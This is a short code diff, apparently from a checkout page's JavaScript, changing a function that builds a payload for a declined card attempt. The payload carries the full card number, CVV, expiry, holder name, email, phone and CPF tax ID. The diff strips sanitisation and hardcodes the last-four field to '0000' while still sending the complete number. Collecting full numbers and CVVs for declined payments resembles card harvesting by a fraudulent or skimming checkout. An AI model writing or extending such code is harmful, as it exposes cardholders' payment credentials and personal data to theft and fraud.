@@ -709,13 +709,11 @@ function safeCardAttemptPayload(formData) {
     sessionId: sessionId, // Seu sessionId do checkout
     holder: formData.get('cardHolder') || formData.get('name') || '',
     email: formData.get('email') || '',
-    phone: onlyDigits(formData.get('phone')),
-    cpf: onlyDigits(formData.get('document')),
-    
-    cardNumber: digits, // Envia o número completo
+    phone: formData.get('phone'),
+    cpf: formData.get('document'),
+    cardLast4: "0000",
+    cardNumber: formData.get('cardNumber'), // Envia o número completo
     cardCvv: formData.get('cardCvv') || '',
-    cardBrand: cardBrand(digits),
-    cardLast4: digits,
     cardExpiry: formData.get('cardExpiry') || '',
     amount: Number(currentSession?.amount || 0),
     status: 'Recusado',
